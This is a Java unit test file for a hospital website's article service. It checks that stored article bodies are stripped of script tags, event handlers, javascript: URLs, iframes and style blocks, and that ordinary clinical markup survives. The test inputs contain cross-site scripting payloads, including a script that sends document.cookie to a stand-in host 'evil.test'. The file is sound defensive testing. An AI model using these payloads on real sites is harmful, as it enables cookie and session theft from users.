package com.healthcare.hospital;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import com.healthcare.hospital.dto.ArticleRequest;
import com.healthcare.hospital.entity.Article;
import com.healthcare.hospital.repository.ArticleRepository;
import com.healthcare.hospital.service.AdminArticleService;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;
import org.junit.jupiter.api.Test;

/**
 * Article bodies are stored as markdown and the public renderer builds React
 * nodes rather than injecting HTML, so nothing executes today. That safety
 * lives in the consumer, not in the data: the body column also holds rows
 * written before the markdown contract was enforced, and a direct API caller
 * can post anything the size constraint allows.
 *
 * <p>These tests pin the storage-side gate. Following the sibling article
 * contract suite, they use a repository double so they run without
 * Docker/PostgreSQL; the live HTTP path stays a separate runtime gate.
 */
class ArticleBodySanitizationTest {

    private record Fixture(AdminArticleService service, Map<String, Article> records) {
    }

    private Fixture fixture() {
        ArticleRepository repository = mock(ArticleRepository.class);
        Map<String, Article> records = new HashMap<>();
        when(repository.findBySlug(anyString()))
            .thenAnswer(invocation -> Optional.ofNullable(records.get(invocation.getArgument(0))));
        when(repository.saveAndFlush(any(Article.class)))
            .thenAnswer(invocation -> {
                Article article = invocation.getArgument(0);
                records.put(article.getSlug(), article);
                return article;
            });
        return new Fixture(new AdminArticleService(repository), records);
    }

    private String storedBody(String body) {
        Fixture fixture = fixture();
        String slug = "sanitize-fixture-" + System.nanoTime();
        fixture.service().create(new ArticleRequest("Tiêu đề", slug, "Tóm tắt", body, true));
        return fixture.records().get(slug).getBody();
    }

    @Test
    void stripsScriptBlockFromStoredBody() {
        String stored = storedBody(
            "<p>Nội dung y khoa</p><script>fetch('https://evil.test?c='+document.cookie)</script>");

        assertThat(stored).contains("Nội dung y khoa");
        assertThat(stored).doesNotContain("<script");
        assertThat(stored).doesNotContain("document.cookie");
    }

    @Test
    void stripsEventHandlersAndScriptUrls() {
        String stored = storedBody(
            "<p onmouseover=\"steal()\">Xem</p><a href=\"javascript:alert(1)\">Bấm</a>");

        assertThat(stored).doesNotContain("onmouseover");
        assertThat(stored).doesNotContain("javascript:");
        assertThat(stored).contains("Xem");
        assertThat(stored).contains("Bấm");
    }

    @Test
    void stripsEmbeddedBrowsingContexts() {
        String stored = storedBody(
            "<p>Trước</p><iframe src=\"https://evil.test\"></iframe><p>Sau</p>");

        assertThat(stored).doesNotContain("<iframe");
        assertThat(stored).contains("Trước");
        assertThat(stored).contains("Sau");
    }

    @Test
    void stripsStyleBlocksWithTheirCssEscapes() {
        String stored = storedBody(
            "<style>body{background:url(javascript:alert(1))}</style><p>Nội dung</p>");

        assertThat(stored).doesNotContain("<style");
        assertThat(stored).doesNotContain("javascript:");
        assertThat(stored).contains("Nội dung");
    }

    @Test
    void keepsOrdinaryClinicalMarkupIntact() {
        String body = "<h2>Phác đồ</h2><p><strong>Lưu ý:</strong> dùng <em>đúng liều</em>.</p>"
            + "<div class=\"clinical-warning\" data-callout=\"clinical-warning\">"
            + "<p>Cảnh báo lâm sàng</p></div>"
            + "<table><tr><td>5 mg | 3 lần/ngày</td></tr></table>";

        String stored = storedBody(body);

        assertThat(stored).contains("clinical-warning");
        assertThat(stored).contains("<strong>Lưu ý:</strong>");
        assertThat(stored).contains("5 mg | 3 lần/ngày");
    }

    @Test
    void keepsMarkdownBodiesUnchanged() {
        String markdown = "## Phác đồ\n\n- Bước một\n- Bước hai\n\n> Ghi chú lâm sàng";

        assertThat(storedBody(markdown)).isEqualTo(markdown);
    }

    @Test
    void sanitizesOnUpdateAsWellAsCreate() {
        Fixture fixture = fixture();
        String slug = "sanitize-update-fixture";
        fixture.service().create(new ArticleRequest("Tiêu đề", slug, "Tóm tắt", "Nội dung", false));

        fixture.service().update(slug, new ArticleRequest(
            "Tiêu đề", slug, "Tóm tắt", "<p>Giữ lại</p><script>alert(1)</script>", true));

        String stored = fixture.records().get(slug).getBody();
        assertThat(stored).contains("Giữ lại");
        assertThat(stored).doesNotContain("<script");
    }

    @Test
    void preservesNullBody() {
        Fixture fixture = fixture();
        String slug = "sanitize-null-fixture";
        fixture.service().create(new ArticleRequest("Tiêu đề", slug, "Tóm tắt", null, false));

        assertThat(fixture.records().get(slug).getBody()).isNull();
    }
}
